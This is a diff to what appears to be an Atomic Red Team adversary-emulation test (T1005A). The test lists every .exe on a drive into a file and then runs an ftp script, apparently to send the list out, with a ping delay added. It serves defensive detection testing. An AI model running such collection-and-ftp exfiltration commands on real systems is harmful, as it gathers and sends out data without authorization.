@@ -9,13 +9,14 @@ atomic_tests:
   - windows
   input_arguments:
     volume:
-      description: drive_letter
+      description: destination_path
       type: String
-      default: 'C:\'
+      default: 'C:\R5\atomic-red-team\atomics\T1005A\src\exe_list.txt'
   executor:
     command: |
-      dir /s/b *.exe > C:\R5\atomic-red-team\atomics\T1005A\src\exe_list.txt
+      dir /s/b *.exe > #{destination_path}
       ftp -v -n -i -d -s:C:\R5\atomic-red-team\atomics\T1005A\src\ftp_script.txt
+      ping -n 10 127.0.0.1
 
     name: powershell
     elevation_required: true
